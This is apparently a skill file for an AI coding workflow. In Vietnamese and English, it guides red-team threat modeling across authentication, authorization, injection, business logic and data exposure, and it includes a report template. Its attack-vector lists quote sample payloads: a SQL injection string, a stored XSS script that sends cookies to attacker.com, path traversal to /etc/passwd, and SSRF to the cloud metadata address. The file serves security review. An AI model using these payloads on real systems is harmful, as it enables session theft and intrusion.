---
name: awf-red-teaming
description: >
  Adversarial thinking — adopt mindset attacker để tìm seams, abuse paths và failure modes
  mà defensive checklist bỏ qua. Kích hoạt trước khi launch feature nhạy cảm, khi /audit
  chỉ tìm được lỗi bề mặt, hoặc khi user cần stress-test một system/plan.
  Khác /audit (defensive): red-teaming là offensive mindset.
  Keywords: red team, attack, adversarial, stress-test, abuse case, threat model,
  hack, exploit, worst case, break it, tìm lỗ hổng, security review, penetration.
version: 1.0.0
# AWF_METADATA_START
type: skill
name: "awf-red-teaming"
skill_version: "1.0.0"
status: active
category: "security"
activation: "conditional"
priority: "high"
risk_level: "medium"
allowed_side_effects:
  - "generate_report"
requires_confirmation: false
related_workflows:
  - "/audit"
  - "/deploy"
  - "/plan"
required_gates:
  - "global_safety_truthfulness_gate"
# AWF_METADATA_END
---

# AWF Red Teaming — Nghĩ Như Kẻ Tấn Công

## Tổng quan
`/audit` giúp bạn làm đúng checklist. Red teaming giúp bạn nghĩ đến những thứ
không có trong checklist. Attacker không follow playbook — họ tìm seams ở những nơi
defender không nghĩ đến.

> 💡 **Triết lý:** "The best way to defend is to attack first — in your head."

---

## Khi nào kích hoạt

✅ **Triggers:**
- Trước khi launch feature liên quan đến payments, auth, user data, permissions
- Sau `/audit` — khi cần perspective offensive (không chỉ checklist)
- "Stress-test plan này", "Tìm lỗ hổng trong thiết kế", "What could go wrong?"
- Khi user nói "Tôi nghĩ design này an toàn"
- Bất kỳ khi nào có business logic phức tạp về quyền truy cập

---

## Mindset Shift: Defender → Attacker

```
Defender hỏi: "Cái này có secure không?"
Attacker hỏi: "Làm thế nào để break cái này?"

Defender hỏi: "Users sẽ không làm vậy đâu"
Attacker hỏi: "Điều gì xảy ra nếu ai đó CỐ TÌNH làm vậy?"

Defender hỏi: "Đây là intended behavior"
Attacker hỏi: "Intended behavior + edge input = unintended outcome không?"
```

---

## 5 Threat Categories cần cover

### 1. Broken Authentication & Session
```
Attack vectors:
- Brute force với credential stuffing (passwords từ data breaches)
- Session fixation — attacker set session ID trước khi user login
- Predictable session tokens (timestamp-based, sequential)
- JWT "none" algorithm attack
- Concurrent session không bị invalidate khi logout

Câu hỏi cần hỏi:
→ Nếu tôi có 10,000 leaked password combos, tôi có thể login không?
→ Nếu tôi grab session token của user A, tôi có thể impersonate họ bao lâu?
→ Sau khi user đổi password, các session cũ có bị kill không?
```

### 2. Broken Authorization & Privilege Escalation
```
Attack vectors:
- IDOR (Insecure Direct Object Reference): /api/orders/12345 → thử /api/orders/12344
- Horizontal escalation: user A access data của user B cùng role
- Vertical escalation: user → admin bằng cách modify request params
- Mass assignment: thêm "role: admin" vào request body
- Function-level authorization bypass: URL direct access không qua UI

Câu hỏi cần hỏi:
→ Nếu tôi đổi user_id trong API request, tôi có đọc được data người khác không?
→ Có endpoint nào chỉ check "logged in" nhưng không check "có quyền không"?
→ Nếu tôi gửi thêm field "isAdmin: true", server có chấp nhận không?
```

### 3. Input Manipulation & Injection
```
Attack vectors:
- SQLi: ' OR '1'='1 trong search fields
- XSS stored: comment với <script>document.location='attacker.com?c='+document.cookie</script>
- Path traversal: ../../etc/passwd trong filename param
- SSRF: URL param trỏ đến internal services (169.254.169.254 cho AWS metadata)
- ReDoS: regex catastrophic backtracking với crafted input

Câu hỏi cần hỏi:
→ Mọi text field có thể nhận được ký tự đặc biệt không? Chuyện gì xảy ra?
→ Nếu tôi upload file với tên "../../../config.env", file lưu ở đâu?
→ Nếu tôi truyền URL internal vào webhook field, server có fetch không?
```

### 4. Business Logic Flaws
```
Attack vectors:
- Race condition: click "Buy" 2 lần cùng lúc → 2 orders với 1 lần charge
- Negative quantities: thêm -1 item vào cart → tiền được cộng vào
- Coupon stacking: apply nhiều coupons "single use"
- Workflow bypass: skip step 2/3 trong checkout bằng cách POST trực tiếp step 3
- Integer overflow: số lượng quá lớn gây overflow thành negative

Câu hỏi cần hỏi:
→ Nếu tôi submit order 2 lần trong 100ms, chuyện gì xảy ra?
→ Có thể nhập số âm không? Số 0 không? Số rất lớn không?
→ Tôi có thể skip bước nào trong user flow không?
```

### 5. Data Exposure & Privacy
```
Attack vectors:
- Verbose error messages với stack traces, DB schemas, internal paths
- API responses include sensitive fields không cần thiết (passwordHash, internal IDs)
- Log files với sensitive data (tokens, PII, credit cards)
- S3/blob storage public access không intentional
- HTTP (không HTTPS) cho sensitive endpoints

Câu hỏi cần hỏi:
→ Khi xảy ra lỗi, user thấy gì? Stack trace? DB error?
→ API response có field nào không cần thiết cho client không?
→ Logs có capture gì từ request body không? Password? Token?
```

---

## Red Team Report Format

```markdown
# Red Team Assessment: [System/Feature]
**Date:** [Date] | **Scope:** [Gì được test] | **Severity scale:** Critical > High > Medium > Low

## Executive Summary
[2-3 câu về overall security posture và most critical findings]

## Findings

### 🔴 CRITICAL: [Tên vulnerability]
**Attack vector:** [Mô tả cách exploit]
**Impact:** [Nếu bị exploit, thiệt hại là gì?]
**Reproduction:**
1. [Step 1]
2. [Step 2]
3. [Kết quả]

**Remediation:** [Cách fix cụ thể]
**Effort to fix:** Low/Medium/High

---

### 🟠 HIGH: [Tên vulnerability]
...

### 🟡 MEDIUM: [Tên vulnerability]
...

## Không tìm thấy lỗ hổng cho
- [Area được test và không tìm thấy issue]

## Out of scope (không test)
- [Lý do không test]

## Recommendations Priority
1. Fix ngay (CRITICAL): [List]
2. Fix trước launch (HIGH): [List]
3. Fix trong sprint tới (MEDIUM): [List]
```

---

## Abuse Case Generator

Khi review một feature, tự generate abuse cases:

```
Feature: [Mô tả feature]

Abuse cases em tự nghĩ ra:
1. "What if user gửi X thay vì Y?"
2. "What if request được repeat 1000 lần?"
3. "What if user A manipulate data để affect user B?"
4. "What if malicious input được truyền vào field Z?"
5. "What if authentication bị bypass hoàn toàn?"
6. "What if server crash giữa chừng một transaction?"
7. "What if user có quyền thấp escalate lên quyền cao hơn?"
```

---

## Tích hợp với AWF

| Workflow | Red teaming tích hợp |
|---------|---------------------|
| `/audit` | Bổ sung offensive perspective sau defensive checklist |
| `/design` | Pre-emptive threat modeling trong design phase |
| `/test` | Tạo adversarial test cases cho security-critical paths |
| `awf-shipping-launch` | Red team checkpoint trước staged rollout |

**Rule:** Red team TRƯỚC khi deploy, không phải sau.

---

## ⚠️ Anti-Rationalization

| Lý do bỏ qua | Thực tế |
|---|---|
| "Attacker không biết hệ thống của mình" | Assume worst case: attacker có source code (insider threat, leak). |
| "Logic này quá phức tạp để exploit" | Complexity hides bugs. Attackers có thời gian và kiên nhẫn. |
| "Đây là internal app" | Internal apps bị compromise từ phishing, insider threat, VPN breach. |
| "Đã có /audit rồi" | Audit = checklist. Red team = adversarial thinking. Cần cả 2. |
| "Users sẽ không abuse" | 99% không. 1% sẽ. Build for the 1%. |

---

## 🚩 Red Flags (Đây là những thứ red team HAY tìm thấy nhất)

- Object IDs sequential và predictable (1, 2, 3...) → IDOR risk cao
- Error pages hiển thị stack traces
- API không có rate limiting
- File upload không validate type và content
- Redirect URLs không whitelist
- "Admin" endpoints không có extra auth layer
- JWT không verify signature (algorithm: none)
- Bulk operations không có rate limiting hay size limits
